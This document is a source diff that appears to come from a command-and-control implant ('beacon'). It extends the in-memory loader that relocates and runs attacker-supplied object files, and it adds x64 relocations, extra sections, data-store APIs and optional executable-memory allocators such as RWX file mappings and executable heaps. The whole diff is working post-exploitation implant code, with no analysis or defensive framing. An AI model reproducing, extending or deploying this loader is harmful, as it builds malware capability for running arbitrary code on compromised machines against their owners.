@@ -6,13 +6,16 @@
  */
 #include <Windows.h>
 #include <stdio.h>
+#include <limits.h>
 #include "commands.h"
 #include "beacon.h"
 #include "parse.h"
 #include "inject.h"
 #include "bformat.h"
+#include "datastore.h"
 
 #define RELOC_ENDTABLE 0
+#define RELOC_ADDR64   1
 #define RELOC_ADDR32   6
 #define RELOC_REL32    20
 #define RELOC64_REL32_0  4
@@ -27,6 +30,10 @@
 #define SYMBOL_TEXT          1026
 #define SYMBOL_DYNAMICF      1027
 #define SYMBOL_END           1028
+#define SYMBOL_XDATA         1029
+#define SYMBOL_PDATA         1030
+#define SYMBOL_BSS           1031
+#define BOF_DYNAMIC_SLOTS    64
 
 static void postmsgf(int type, char * fmt, ...) {
 	va_list va;
@@ -100,6 +107,7 @@ static void inject_explicit_process(HANDLE hProcess, int pid, char * payload, in
 }
 
 typedef struct {
+	int   section; /* 4.9: which section the reloc lives in (TEXT/DATA/PDATA) */
 	short type;
 	short symbol;
 	int   offset;
@@ -152,21 +160,32 @@ typedef struct {
 	/* Utility Functions */
 	BOOL   (*toWideChar)(char * src, wchar_t * dst, int max);
 
+	/* 4.9 BOF APIs — order matches resources/bapi.txt */
+	void   (*BeaconInformation)(BEACON_INFO * info);
+	BOOL   (*BeaconAddValue)(const char * key, void * ptr);
+	void * (*BeaconGetValue)(const char * key);
+	BOOL   (*BeaconRemoveValue)(const char * key);
+	PDATA_STORE_OBJECT (*BeaconDataStoreGetItem)(size_t index);
+	void   (*BeaconDataStoreProtectItem)(size_t index);
+	void   (*BeaconDataStoreUnprotectItem)(size_t index);
+	size_t (*BeaconDataStoreMaxEntries)(void);
+	char * (*BeaconGetCustomUserData)(void);
+
 	/* our other pointers */
-	void * other[32];
+	void * other[BOF_DYNAMIC_SLOTS];
 } BOFF_FUNCTIONS;
 
 void * function_slot(BOFF_FUNCTIONS * f, void * ptr) {
 	int x;
 
 	/* try and find our pointer and return a pointer to it! */
-	for (x = 0; x < 32; x++) {
+	for (x = 0; x < BOF_DYNAMIC_SLOTS; x++) {
 		if (f->other[x] == ptr)
 			return &(f->other[x]);
 	}
 
 	/* boo... OK, find a NULL pointer and return a pointer to that */
-	for (x = 0; x < 32; x++) {
+	for (x = 0; x < BOF_DYNAMIC_SLOTS; x++) {
 		if (f->other[x] == NULL) {
 			f->other[x] = ptr;
 			return &(f->other[x]);
@@ -224,6 +243,16 @@ void setup_functions(BOFF_FUNCTIONS * f) {
 
 	/* utility functions */
 	f->toWideChar                   = toWideChar;
+
+	f->BeaconInformation            = BeaconInformation;
+	f->BeaconAddValue               = BeaconAddValue;
+	f->BeaconGetValue               = BeaconGetValue;
+	f->BeaconRemoveValue            = BeaconRemoveValue;
+	f->BeaconDataStoreGetItem       = BeaconDataStoreGetItem;
+	f->BeaconDataStoreProtectItem   = BeaconDataStoreProtectItem;
+	f->BeaconDataStoreUnprotectItem = BeaconDataStoreUnprotectItem;
+	f->BeaconDataStoreMaxEntries    = BeaconDataStoreMaxEntries;
+	f->BeaconGetCustomUserData      = BeaconGetCustomUserData;
 }
 
 /*
@@ -265,7 +294,14 @@ BOOL process_reloc(OBJ_RELOC * reloc, char * execsrc, char * execdst, char * sym
 		return TRUE;
 	}
 #elif defined _M_X64
-	if (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5) {
+	if (reloc->type == RELOC_ADDR64) {
+		UINT64 addr, offset;
+		memcpy(&offset, execsrc + reloc->offset, 8);
+		addr = (UINT64)(ULONG_PTR)symbol + offset + (UINT64)(ULONG_PTR)soff;
+		memcpy(execsrc + reloc->offset, &addr, 8);
+		return TRUE;
+	}
+	else if (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5) {
 		char * rip, * fsymbol;
 		DWORD offset, addr;
 		INT64 check;
@@ -313,137 +349,216 @@ BOOL process_reloc(OBJ_RELOC * reloc, char * execsrc, char * execdst, char * sym
 	//dlog("Reloc[type: %d, symbol: %d, offset: %d, offset_in_section: %d]", r->type, r->symbol, r->offset, r->offset_in_section);
 //}
 
-void command_inline_execute_object(char * buffer, int length) {
-	/* our arguments */
-	datap        parser;
-	datap        relocsparser;
-	DWORD        entry;
-	datap_buffer code;
-	datap_buffer rdata;
-	datap_buffer data;
-	datap_buffer relocs;
-	datap_buffer args;
+static char * bof_section_base(int id, char * text, char * rdata, char * data, char * xdata, char * pdata, char * bss) {
+	switch (id) {
+	case SYMBOL_RDATA: return rdata;
+	case SYMBOL_DATA:  return data;
+	case SYMBOL_TEXT:  return text;
+	case SYMBOL_XDATA: return xdata;
+	case SYMBOL_PDATA: return pdata;
+	case SYMBOL_BSS:   return bss;
+	default:           return text;
+	}
+}
 
-	/* the functions we plan to call */
+static char * bof_alloc(SIZE_T total, int * how) {
+	DWORD perms = setting_short(SETTING_PROCINJ_PERMS_I);
+	int allocator = setting_short(SETTING_BOF_ALLOCATOR);
+	*how = allocator;
+	if (allocator == 1) {
+		HANDLE map = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)total, NULL);
+		char * p;
+		if (map == NULL)
+			return NULL;
+		p = (char *)MapViewOfFile(map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, total);
+		CloseHandle(map);
+		return p;
+	}
+	if (allocator == 2) {
+		HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
+		if (heap == NULL)
+			return NULL;
+		return (char *)HeapAlloc(heap, HEAP_ZERO_MEMORY, total);
+	}
+	*how = 0;
+	if (perms == 0)
+		perms = PAGE_READWRITE;
+	return (char *)VirtualAlloc(NULL, total, MEM_RESERVE | MEM_COMMIT, perms);
+}
+
+static void bof_free(char * p, int how) {
+	if (p == NULL)
+		return;
+	if (how == 1)
+		UnmapViewOfFile(p);
+	else if (how == 2)
+		return; /* HeapCreate block is not tracked; leak vs double-free. reuse covers this. */
+	else
+		VirtualFree(p, 0, MEM_RELEASE);
+}
+
+static char * bof_cached;
+static SIZE_T bof_cached_size;
+static int    bof_cached_how;
+
+void command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen) {
+	datap parser;
+	datap relocsparser;
+	datap_buffer code, rdata, data, xdata, pdata, relocs;
+	DWORD bssSize;
 	BOFF_FUNCTIONS * ftable;
-
-	/* stuff we need */
 	void(*inlinefunc)(char * buffer, int length);
-	char       * execpatch;
-	OBJ_RELOC  * reloc;
-	BOOL         success = FALSE; /* Assume failure walking our relocations and fix code.buffer */
+	char * base;
+	char * code_dst;
+	char * rdata_dst;
+	char * data_dst;
+	char * xdata_dst;
+	char * pdata_dst;
+	char * bss_dst;
+	SIZE_T total;
+	OBJ_RELOC * reloc;
+	BOOL success = FALSE;
+	int how = 0;
 
-	/* setup our function table */
 	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
+	if (ftable == NULL)
+		return;
 	setup_functions(ftable);
 
-	/* extract our arguments */
-	data_init(&parser, buffer, length);
-	entry  = data_int(&parser);
-	code   = data_extract(&parser);
-	rdata  = data_extract(&parser);
-	data   = data_extract(&parser);
+	data_init(&parser, objblob, objlen);
+	bssSize = data_int(&parser);
+	code = data_extract(&parser);
+	rdata = data_extract(&parser);
+	data = data_extract(&parser);
+	xdata = data_extract(&parser);
+	pdata = data_extract(&parser);
 	relocs = data_extract(&parser);
-	args   = data_extract(&parser);
 
-	/* init and copy over to it */
-	execpatch = (char *)VirtualAlloc(NULL, code.length, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
-	if (execpatch == NULL) {
+	total = (SIZE_T)code.length + rdata.length + data.length + xdata.length + pdata.length + bssSize;
+	if (total == 0) {
 		free(ftable);
 		return;
 	}
 
-	/* initialize a parser for our relocations */
+	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
+		base = bof_cached;
+		how = bof_cached_how;
+		memset(base, 0, total);
+	}
+	else {
+		if (bof_cached != NULL && !setting_short(SETTING_BOF_REUSE_MEMORY)) {
+			bof_free(bof_cached, bof_cached_how);
+			bof_cached = NULL;
+			bof_cached_size = 0;
+		}
+		base = bof_alloc(total, &how);
+		if (base == NULL) {
+			free(ftable);
+			return;
+		}
+		bof_cached = base;
+		bof_cached_size = total;
+		bof_cached_how = how;
+	}
+
+	code_dst = base;
+	rdata_dst = code_dst + code.length;
+	data_dst = rdata_dst + rdata.length;
+	xdata_dst = data_dst + data.length;
+	pdata_dst = xdata_dst + xdata.length;
+	bss_dst = pdata_dst + pdata.length;
+
+	if (code.buffer) memcpy(code_dst, code.buffer, code.length);
+	if (rdata.buffer) memcpy(rdata_dst, rdata.buffer, rdata.length);
+	if (data.buffer) memcpy(data_dst, data.buffer, data.length);
+	if (xdata.buffer) memcpy(xdata_dst, xdata.buffer, xdata.length);
+	if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);
+
 	data_init(&relocsparser, relocs.buffer, relocs.length);
-
-	/* walk our relocations and fix code.buffer */
 	while (TRUE) {
-		/* grab our relocation object */
+		char * src;
+		char * dst;
+		char * sym;
 		reloc = (OBJ_RELOC *)data_ptr(&relocsparser, sizeof(OBJ_RELOC));
-
-		//print_reloc(reloc);
-
-		/* we're done successfully */
+		if (reloc == NULL)
+			break;
 		if (reloc->symbol == SYMBOL_END) {
 			success = TRUE;
 			break;
 		}
-		/* pointer to .rdata which has all of our strings */
-		else if (reloc->symbol == SYMBOL_RDATA) {
-			if (!process_reloc(reloc, code.buffer, execpatch, rdata.buffer, reloc->offset_in_section))
-				break;
-		}
-		else if (reloc->symbol == SYMBOL_DATA) {
-			if (!process_reloc(reloc, code.buffer, execpatch, data.buffer, reloc->offset_in_section))
-				break;
-		}
-		else if (reloc->symbol == SYMBOL_TEXT) {
-			if (!process_reloc(reloc, code.buffer, execpatch, execpatch, reloc->offset_in_section))
-				break;
-		}
-		else if (reloc->symbol == SYMBOL_DYNAMICF) {
-			/* we need to rip the function name and module handle out */
-			char * lib;
-			char * fun;
+		src = bof_section_base(reloc->section, code.buffer, rdata.buffer, data.buffer, xdata.buffer, pdata.buffer, bss_dst);
+		dst = bof_section_base(reloc->section, code_dst, rdata_dst, data_dst, xdata_dst, pdata_dst, bss_dst);
+		if (src == NULL)
+			src = code.buffer;
+		if (dst == NULL)
+			dst = code_dst;
+
+		if (reloc->symbol == SYMBOL_DYNAMICF) {
+			char * lib = data_string_asciiz(&relocsparser);
+			char * fun = data_string_asciiz(&relocsparser);
 			void * ptr;
 			void * slot;
-			HMODULE mod;
-
-			/* grab our library and function name */
-			lib = data_string_asciiz(&relocsparser);
-			fun = data_string_asciiz(&relocsparser);
-
-			/* resolve our module */
-			mod = GetModuleHandleA(lib);
+			HMODULE mod = GetModuleHandleA(lib);
 			if (mod == NULL)
 				mod = LoadLibraryA(lib);
-
-			/* resolve our function */
 			ptr = GetProcAddress(mod, fun);
 			if (ptr == NULL) {
 				post_error(0x4c, "%s!%s", lib, fun);
 				break;
 			}
-
-			/* find a slot for our dynamically resolved function */
 			slot = function_slot(ftable, ptr);
 			if (slot == NULL) {
 				post_error_na(0x4e);
 				break;
 			}
-
-			/* patch in this dynamically resolved symbol */
-			if (!process_reloc(reloc, code.buffer, execpatch, (char *)slot, 0))
+			if (!process_reloc(reloc, src, dst, (char *)slot, 0))
 				break;
 		}
-		/* request for something in our function table */
+		else if (reloc->symbol < 1024) {
+			if (!process_reloc(reloc, src, dst, (char *)ftable + (reloc->symbol * sizeof(char *)), 0))
+				break;
+		}
 		else {
-			if (!process_reloc(reloc, code.buffer, execpatch, (char *)ftable + (reloc->symbol * sizeof(char *)), 0))
+			sym = bof_section_base(reloc->symbol, code_dst, rdata_dst, data_dst, xdata_dst, pdata_dst, bss_dst);
+			if (!process_reloc(reloc, src, dst, sym, reloc->offset_in_section))
 				break;
 		}
 	}
 
 	if (success) {
-		/* copy payload to our area */
-		memcpy(execpatch, code.buffer, code.length);
-
-		/* in case we have a crash, let's not have our code co-located with strings and such */
-		memset(code.buffer, 0, code.length);
-
-		/* cast our inline func, please */
-		inlinefunc = (void(*)(char * buffer, int length))(execpatch + entry);
-
-		/* make the patch executable now */
-		if (finalize_memory_permissions(execpatch, code.length)) {
-			/* call it */
-			//__debugbreak();
-			inlinefunc(args.buffer, args.length);
-		}
+		if (code.buffer)
+			memset(code.buffer, 0, code.length);
+		inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
+		if (finalize_memory_permissions(base, total))
+			inlinefunc(args, alen);
 	}
 
-	/* OK, cleanup! */
-	VirtualFree(execpatch, 0, MEM_RELEASE);
-
-	/* kill our table */
+	if (!setting_short(SETTING_BOF_REUSE_MEMORY)) {
+		bof_free(base, how);
+		if (bof_cached == base) {
+			bof_cached = NULL;
+			bof_cached_size = 0;
+		}
+	}
 	free(ftable);
+}
+
+void command_inline_execute_object(char * buffer, int length) {
+	datap parser;
+	DWORD entry;
+	datap_buffer args;
+	int prefix_len;
+
+	data_init(&parser, buffer, length);
+	data_int(&parser);       /* bssSize */
+	data_extract(&parser);   /* code */
+	data_extract(&parser);   /* rdata */
+	data_extract(&parser);   /* data */
+	data_extract(&parser);   /* xdata */
+	data_extract(&parser);   /* pdata */
+	data_extract(&parser);   /* relocs */
+	prefix_len = length - parser.length;
+	entry = data_int(&parser);
+	args = data_extract(&parser);
+	command_inline_execute_object_parsed(buffer, prefix_len, entry, args.buffer, args.length);
 }
